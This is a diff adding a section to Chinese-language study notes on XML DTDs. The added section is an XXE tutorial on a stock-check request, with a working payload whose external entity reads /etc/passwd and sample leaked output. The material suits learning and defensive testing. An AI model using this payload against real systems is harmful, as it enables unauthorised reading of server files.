@@ -108,3 +108,20 @@ DTD 的作用
 
 总之，DTD 是早期 XML 数据验证和描述文档结构的一种机制，尽管它已经被更强大的 XML Schema（XSD）所取代，但在一些简单的 XML 应用场景中仍然有使用。
 # 用xxe读取文件
+例如，假设购物应用程序通过向服务器提交以下 XML 来检查产品的库存水平：
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>381</productId></stockCheck>
+```
+该应用程序对 XXE 攻击没有特别的防御，因此您可以利用 XXE 漏洞通过提交以下 XXE 负载来获取 /etc/passwd 文件：
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
+此 XXE 有效负载定义一个外部实体 &xxe;，其值是 /etc/passwd 文件的内容，并使用 productId 值中的实体。这会导致应用程序的响应包含文件的内容：
+Invalid product ID: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+对于现实世界的 XXE 漏洞，提交的 XML 中通常会有大量数据值，其中任何一个都可能在应用程序的响应中使用。要系统地测试 XXE 漏洞，您通常需要单独测试 XML 中的每个数据节点，方法是使用您定义的实体并查看它是否出现在响应中。
